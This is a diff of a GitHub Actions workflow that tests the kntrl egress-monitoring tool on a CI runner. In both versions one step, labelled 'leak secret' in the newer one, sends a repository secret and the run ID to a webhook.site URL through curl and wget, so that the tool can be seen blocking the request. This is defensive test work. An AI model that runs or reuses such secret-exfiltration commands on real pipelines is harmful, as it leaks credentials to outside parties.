@@ -1,104 +1,65 @@
-name: CI with kntrl Security
+# This is a basic workflow to help you get started with Actions
 
+name: CI
+
+# Controls when the workflow will run
 on:
+  # Triggers the workflow on push or pull request events but only for the "main" branch
   push:
   workflow_dispatch:
 
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
+  # This workflow contains a single job called "build"
   build:
-    runs-on: epbfrunner2
+    # The type of runner that the job will run on
+    runs-on: epbfrunner 
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - uses: actions/checkout@v3
 
-      - name: Environment Setup
+      # Runs a single command using the runners shell
+      - name: Run a one-line script... prepare
         run: | 
-          echo "Setting up environment..."
-          env
-          echo "Current directory: $(pwd)"
-          echo "Temp directory: /tmp"
-          ls -la /tmp
-
-      - name: Install dependencies
+           echo Hello, world!!
+           env
+      - name: Install dependencies (ARM)
         run: |
           sudo apt-get update
           sudo apt-get install -y wget curl
 
-      - name: Setup and Start kntrl
+      # Runs a single command using the runners shell
+      # wget download.kondukto.io/kntrl/kntrl -q
+      - name: Run a KNTRL
         run: |
-          echo "Downloading kntrl..."
           wget -q https://github.com/kondukto-io/kntrl/releases/download/v0.1.3/kntrl 
           chmod +x kntrl
+          sudo ./kntrl start --mode=trace --allowed-hosts=download.kondukto.io --allow-github-meta=true &
           
-          
-          echo "Starting kntrl with explicit output file..."
-          sudo ./kntrl start --mode=trace \
-            --allowed-hosts=download.kondukto.io,github.com \
-            --allow-github-meta=true \
-            --output-file-name=/tmp/kntrl_report.out \
-            --verbose &
-            
-          echo "Waiting for kntrl to initialize..."
-          sleep 5
-          
-          # Verify kntrl is running
-          echo "Checking if kntrl is running..."
-          ps aux | grep kntrl
-          
-          # Check if output directory is writable
-          echo "Checking if /tmp is writable..."
-          touch /tmp/test_write && echo "Yes, /tmp is writable" || echo "No, /tmp is not writable"
-          
-          # List kntrl processes
-          echo "kntrl processes:"
-          ps aux | grep -i kntrl
-
-      - name: Test allowed request
-        run: |
-          echo "Testing allowed request to download.kondukto.io..."
-          curl -v https://download.kondukto.io 2>&1 | grep "HTTP/"
-      
-      - name: Test disallowed request with secret
+      # Runs a set of commands using the runners shell
+      - name: Stop prevent action
         env:
           SECRET: ${{ secrets.MY_SECRET }}
         run: |
-          echo "Testing disallowed request with secret..."
-          curl --connect-timeout 5 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET&id=$GITHUB_RUN_ID || echo "Request blocked as expected"
-          wget --connect-timeout=3 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET&id=$GITHUB_RUN_ID || echo "Request blocked as expected"
-
-      - name: Look for kntrl report files
-        run: |
-          echo "Searching for kntrl report files..."
-          sudo find / -name "kntrl*.out" -o -name "*.out" | grep -i kntrl || echo "No kntrl report files found"
+          echo "leak secret"
+          curl --connect-timeout 10 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET\&id=$GITHUB_RUN_ID || true
+          wget --connect-timeout=3 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET\&id=$GITHUB_RUN_ID || true
           
-          # Check common locations
-          ls -la /tmp/kntrl*.out 2>/dev/null || echo "No kntrl*.out files in /tmp"
-          ls -la /var/log/kntrl* 2>/dev/null || echo "No kntrl files in /var/log"
-          ls -la ./kntrl*.out 2>/dev/null || echo "No kntrl*.out files in current directory"
-
-      - name: Print kntrl report
+        # Runs a set of commands using the runners shell
+        #           wget --connect-timeout=3 https://download.kondukto.io/kntrl/myartifact.txt 
+      - name: Run allowed action
         run: |
-          echo "Printing kntrl report..."
+          echo "download artifacts..."
+
+      # Runs a set of commands using the runners shell
+      # sudo ./kntrl stop
+      - name: print report
+        run: |
+          echo "Print report"
           echo "---------------------"
-          cat /tmp/kntrl_report.out 2>/dev/null || echo "Report file not found at /tmp/kntrl_report.out"
+          cat /tmp/kntrl.out
           echo "---------------------"
+          sudo ./kntrl stop
           
-          # Try to find and print any kntrl report
-          REPORT_FILES=$(sudo find / -name "kntrl*.out" 2>/dev/null)
-          if [ -n "$REPORT_FILES" ]; then
-            echo "Found report files:"
-            echo "$REPORT_FILES"
-            for file in $REPORT_FILES; do
-              echo "Contents of $file:"
-              cat "$file"
-            done
-          else
-            echo "No kntrl report files found anywhere"
-          fi
-
-      - name: Stop kntrl
-        run: |
-          echo "Stopping kntrl..."
-          sudo ./kntrl stop || echo "Failed to stop kntrl"
-          
-          # Kill any remaining kntrl processes
-          sudo pkill -f kntrl || echo "No kntrl processes to kill"
